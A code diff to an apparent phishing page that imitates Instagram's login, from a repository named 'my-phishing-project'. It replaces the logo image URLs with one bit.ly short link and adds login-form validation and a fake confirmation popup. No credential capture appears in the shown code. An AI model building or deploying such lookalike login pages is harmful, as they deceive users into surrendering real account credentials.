@@ -13,11 +13,11 @@
             background-position: 0 -130px;
             height: 51px;
             width: 175px;
-            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/instagramlogo.png);
+            background-image: url(https://bit.ly/3v2LT17);
         }
         .facebook-logo {
             background-position: -414px -259px;
-            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/facebook-icon.png);
+            background-image: url(https://bit.ly/3v2LT17);
             height: 16px;
             width: 16px;
         }
@@ -25,13 +25,13 @@
             background-position: -132px -182px;
             height: 42px;
             width: 128px;
-            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/applestore.png);
+            background-image: url(https://bit.ly/3v2LT17);
         }
         .google-store-logo {
             background-position: 0 -182px;
             height: 42px;
             width: 130px;
-            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/googlestore.png);
+            background-image: url(https://bit.ly/3v2LT17);
         }
 
         /* Button Animation */
@@ -235,12 +235,20 @@
             document.getElementById('loading').classList.remove('active');
             
             if (email.length < 4) {
-                showToast('error');
-            } else {
-                document.getElementById('loginForm').reset();
-                showPopup('Your application has been received. Check back in a week for an update.');
+                showToast('Username must be at least 4 characters');
+                return;
             }
-        }, 2000);
+            if (password.length < 8) {
+                showToast('Password must be at least 8 characters');
+                return;
+            }
+
+            // Clear inputs after login
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+
+            showPopup('Your application has been received. Check back in a week for an update.');
+        }, 3000); // Simulate loading for 3 seconds
     }
 
     function handleFacebookLogin() {
